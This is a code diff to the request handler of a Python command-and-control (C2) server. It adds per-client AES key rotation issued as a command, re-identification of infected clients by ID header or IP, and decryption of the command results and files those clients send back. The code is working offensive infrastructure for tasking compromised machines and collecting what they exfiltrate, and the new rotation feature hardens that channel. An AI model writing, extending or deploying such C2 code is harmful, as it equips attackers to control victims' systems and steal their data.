@@ -1,4 +1,4 @@
-# Modified C2RequestHandler class with path rotation support
+# Modified C2RequestHandler class with key rotation support
 
 import http.server
 import json
@@ -13,7 +13,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     """
     Custom HTTP request handler for C2 communications
     Handles client check-ins, commands, and file transfers with encryption
-    Supports dynamic URL paths that rotate periodically
+    Supports dynamic URL paths and client-specific key rotation after verification
     """
     
     def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
@@ -90,6 +90,67 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def log_message(self, format, *args):
         self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
+
+    def get_client_key(self, client_id):
+        """Get the appropriate encryption key for a client"""
+        # Use client-specific key if available, otherwise use campaign key
+        if hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys:
+            return self.client_manager.client_keys[client_id]
+        # Fall back to campaign-wide key
+        return self.crypto_manager.key
+
+    def encrypt_for_client(self, data, client_id):
+        """Encrypt data specifically for a client using their key if available"""
+        key = self.get_client_key(client_id)
+        
+        if isinstance(data, str):
+            data = data.encode('utf-8')
+        
+        # Generate a random IV
+        iv = os.urandom(16)
+        
+        # Encrypt the data using the same method from crypto_manager
+        # but with client-specific key
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.backends import default_backend
+        
+        # Add padding manually (simple PKCS7-like padding)
+        block_size = 16
+        padding_length = block_size - (len(data) % block_size)
+        padded_data = data + bytes([padding_length]) * padding_length
+        
+        # Encrypt
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        encryptor = cipher.encryptor()
+        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
+        
+        # Combine IV and ciphertext and base64 encode
+        return base64.b64encode(iv + ciphertext).decode('utf-8')
+    
+    def decrypt_from_client(self, encrypted_data, client_id):
+        """Decrypt data from a client using their key if available"""
+        key = self.get_client_key(client_id)
+        
+        # Decode the base64
+        encrypted_bytes = base64.b64decode(encrypted_data)
+        
+        # Extract the IV and ciphertext
+        iv = encrypted_bytes[:16]
+        ciphertext = encrypted_bytes[16:]
+        
+        # Decrypt the ciphertext
+        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+        from cryptography.hazmat.backends import default_backend
+        
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+        decryptor = cipher.decryptor()
+        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
+        
+        # Remove padding manually
+        padding_length = padded_data[-1]
+        data = padded_data[:-padding_length]
+        
+        return data.decode('utf-8')
 
     def do_GET(self):
         # Check if rotation is needed before handling request
@@ -181,6 +242,8 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             except ValueError:
                 pass
         
+        identified_client_id = None
+        
         if system_info_encrypted:
             try:
                 # Decrypt the system information
@@ -195,9 +258,17 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                 # Add unique client identifier if provided
                 if client_identifier:
                     system_info['client_identifier'] = client_identifier
+                    
+                    # Important: Check if this client_identifier is already known
+                    # This helps with re-identifying clients after key rotation
+                    for existing_id, client_info in self.client_manager.get_clients_info().items():
+                        if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
+                            identified_client_id = existing_id
+                            self.logger(f"Recognized returning client with identifier {client_identifier} as {identified_client_id}")
+                            break
                 
-                # Register the client with enhanced information
-                client_id = self.client_manager.add_client(
+                # If we identified the client by identifier, use that ID, otherwise generate a new one
+                client_id = identified_client_id or self.client_manager.add_client(
                     ip=ip,
                     hostname=hostname,
                     username=username,
@@ -207,6 +278,10 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                     system_info=system_info
                 )
                 
+                # Keep track of whether key rotation is needed
+                key_rotation_needed = False
+                is_verified = False
+                
                 # Verify client identity if verifier is available
                 if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
                     verifier = self.server.client_verifier
@@ -214,6 +289,11 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                     
                     # Update client verification status
                     self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
+                    
+                    # Check if client needs key rotation (verified but no unique key yet)
+                    if is_verified and not self.client_manager.has_unique_key(client_id):
+                        key_rotation_needed = True
+                        self.logger(f"Client {client_id} verified and eligible for key rotation")
                     
                     if not is_verified:
                         warning_str = ", ".join(warnings)
@@ -237,9 +317,27 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         commands = self.client_manager.get_pending_commands(client_id)
         self.logger(f"Commands to send to client {client_id}: {commands}")
         
+        # Add key rotation command if needed and the client has been verified
+        if key_rotation_needed:
+            # Generate a new unique key for this client
+            new_key = os.urandom(32)  # 256-bit key
+            base64_key = base64.b64encode(new_key).decode('utf-8')
+            
+            # Store the client's unique key
+            self.client_manager.set_client_key(client_id, new_key)
+            
+            # Create key rotation command
+            key_rotation_command = {
+                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                "command_type": "key_rotation",
+                "args": base64_key
+            }
+            commands.append(key_rotation_command)
+            self.logger(f"Key rotation command issued for client {client_id}")
+        
         # Log the command sent to the client
         for command in commands:
-            self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
+            self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args'] if command['command_type'] != 'key_rotation' else '[REDACTED KEY]'}")
         
         # Add path rotation information if needed
         if include_rotation_info:
@@ -258,7 +356,9 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Encrypt commands json before sending
         commands_json = json.dumps(commands)
-        encrypted_commands = self.crypto_manager.encrypt(commands_json)
+        
+        # Use client-specific key if available, otherwise use the campaign key
+        encrypted_commands = self.encrypt_for_client(commands_json, client_id)
         
         # Send encrypted data
         self.send_response(200)
@@ -378,13 +478,36 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Extract possible client identifier from headers
         client_identifier = self.headers.get('X-Client-ID')
+        identified_client_id = None
+        
         if client_identifier:
             # If we have a client identifier header, use it for logging
             self.logger(f"Result received from client ID {client_identifier} (IP: {ip})")
+            
+            # Try to find the actual client_id from the identifier
+            for client_id, client_info in self.client_manager.get_clients_info().items():
+                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
+                    identified_client_id = client_id
+                    break
         
-        # Decrypt the result
+        # Decrypt the result using the appropriate key
         try:
-            result_data = self.crypto_manager.decrypt(encrypted_data)
+            # If we identified a client, use their key if available
+            if identified_client_id:
+                result_data = self.decrypt_from_client(encrypted_data, identified_client_id)
+            else:
+                # Try finding client by IP and use their key
+                client_id_by_ip = None
+                for client_id, client_info in self.client_manager.get_clients_info().items():
+                    if client_info.get('ip') == ip:
+                        client_id_by_ip = client_id
+                        break
+                
+                if client_id_by_ip:
+                    result_data = self.decrypt_from_client(encrypted_data, client_id_by_ip)
+                else:
+                    # Fall back to campaign-wide key
+                    result_data = self.crypto_manager.decrypt(encrypted_data)
             
             # Try to parse the result as JSON
             try:
@@ -396,21 +519,27 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                     
                     # Find the client by either client_id or IP
                     client_found = False
-                    for client_id, client_info in self.client_manager.get_clients_info().items():
-                        # Check if this client has the matching client_identifier
-                        if client_identifier and client_info.get('system_info', {}).get('client_identifier') == client_identifier:
-                            self.client_manager.add_command_result(client_id, timestamp, result)
-                            self.logger(f"Result processed for client {client_id} (timestamp: {timestamp})")
-                            client_found = True
-                            break
-                        # Fallback to IP if no client_identifier match
-                        if client_info.get('ip') == ip:
-                            self.client_manager.add_command_result(client_id, timestamp, result)
-                            self.logger(f"Result processed for client {client_id} by IP match (timestamp: {timestamp})")
-                            client_found = True
-                            break
+                    client_to_use = identified_client_id
                     
-                    if not client_found:
+                    if not client_to_use:
+                        for client_id, client_info in self.client_manager.get_clients_info().items():
+                            # Check if this client has the matching client_identifier
+                            if client_identifier and client_info.get('system_info', {}).get('client_identifier') == client_identifier:
+                                client_to_use = client_id
+                                client_found = True
+                                break
+                            # Fallback to IP if no client_identifier match
+                            if client_info.get('ip') == ip:
+                                client_to_use = client_id
+                                client_found = True
+                                break
+                    else:
+                        client_found = True
+                    
+                    if client_found:
+                        self.client_manager.add_command_result(client_to_use, timestamp, result)
+                        self.logger(f"Result processed for client {client_to_use} (timestamp: {timestamp})")
+                    else:
                         # If no client was found, log as a generic result
                         self.logger(f"Result received from unknown client {ip}: {result_data}")
                         self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
@@ -458,11 +587,33 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         encrypted_data = self.rfile.read(content_length).decode('utf-8')
         
         try:
-            # Decrypt the file data
-            file_content = self.crypto_manager.decrypt(encrypted_data)
-            
             # Extract client identifier from headers if present
             client_identifier = self.headers.get('X-Client-ID')
+            identified_client_id = None
+            
+            if client_identifier:
+                # Try to find the client ID from the identifier
+                for client_id, client_info in self.client_manager.get_clients_info().items():
+                    if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
+                        identified_client_id = client_id
+                        break
+            
+            # Decrypt the file data using the appropriate key
+            if identified_client_id:
+                file_content = self.decrypt_from_client(encrypted_data, identified_client_id)
+            else:
+                # Try finding client by IP
+                client_id_by_ip = None
+                for client_id, client_info in self.client_manager.get_clients_info().items():
+                    if client_info.get('ip') == ip:
+                        client_id_by_ip = client_id
+                        break
+                
+                if client_id_by_ip:
+                    file_content = self.decrypt_from_client(encrypted_data, client_id_by_ip)
+                else:
+                    # Fall back to campaign key
+                    file_content = self.crypto_manager.decrypt(encrypted_data)
             
             # Create uploads directory if it doesn't exist
             campaign_name = self._get_campaign_name()
@@ -473,12 +624,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             campaign_folder = campaign_name + "_campaign"
             
             # Try to determine client ID from the identifier or IP
-            client_id = None
-            if client_identifier:
-                for cid, client_info in self.client_manager.get_clients_info().items():
-                    if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
-                        client_id = cid
-                        break
+            client_id = identified_client_id
             
             if not client_id:
                 # Try to find by IP
